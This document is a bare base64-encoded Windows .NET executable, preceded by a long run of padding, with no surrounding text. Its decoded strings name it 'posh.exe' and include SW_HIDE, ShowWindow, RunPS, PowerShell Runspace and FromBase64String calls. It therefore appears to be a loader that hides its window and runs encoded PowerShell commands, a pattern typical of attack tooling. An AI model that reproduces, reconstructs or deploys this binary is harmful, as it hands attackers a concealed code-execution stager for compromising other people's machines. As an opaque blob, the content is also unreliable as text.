AEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBB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AMgBVgBBAOkBWwBJAPYBOABBADUCYAAxADwCIQBhAF4AIQAMAIUCcAAUAJMCgABhAJ8ChQB5AMUCiwCBANoCIQAJAOICjwCJAPICjwCRAAADrgCZABQDswCRACUDuQAIAAQADQAIAAgAEgAuAAsAvwAuABMAyAA9AJMAJwE0AWkAeQAAAQMAQgABAAABBQBTAAIABIAAAAAAAAAAAAAAAAAAAAAA8AAAAAQAAAAAAAAAAAAAAAEAGwAAAAAAAQAAAAAAAAAAAAAAQgA/AQAAAAACAAAAAAAAAAAAAAABABsAAAAAAAAAAAAAPE1vZHVsZT4AcG9zaC5leGUAUHJvZ3JhbQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AFNXX0hJREUAU1dfU0hPVwBHZXRDb25zb2xlV2luZG93AFNob3dXaW5kb3cALmN0b3IASW52b2tlQXV0b21hdGlvbgBSdW5QUwBNYWluAGhXbmQAbkNtZFNob3cAY21kAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBwb3NoAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIuZGxsAHVzZXIzMi5kbGwAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbgBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcwBSdW5zcGFjZUZhY3RvcnkAUnVuc3BhY2UAQ3JlYXRlUnVuc3BhY2UAT3BlbgBSdW5zcGFjZUludm9rZQBQaXBlbGluZQBDcmVhdGVQaXBlbGluZQBDb21tYW5kQ29sbGVjdGlvbgBnZXRfQ29tbWFuZHMAQWRkU2NyaXB0AFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbABDb2xsZWN0aW9uYDEAUFNPYmplY3QASW52b2tlAENsb3NlAFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMASUVudW1lcmF0b3JgMQBHZXRFbnVtZXJhdG9yAGdldF9DdXJy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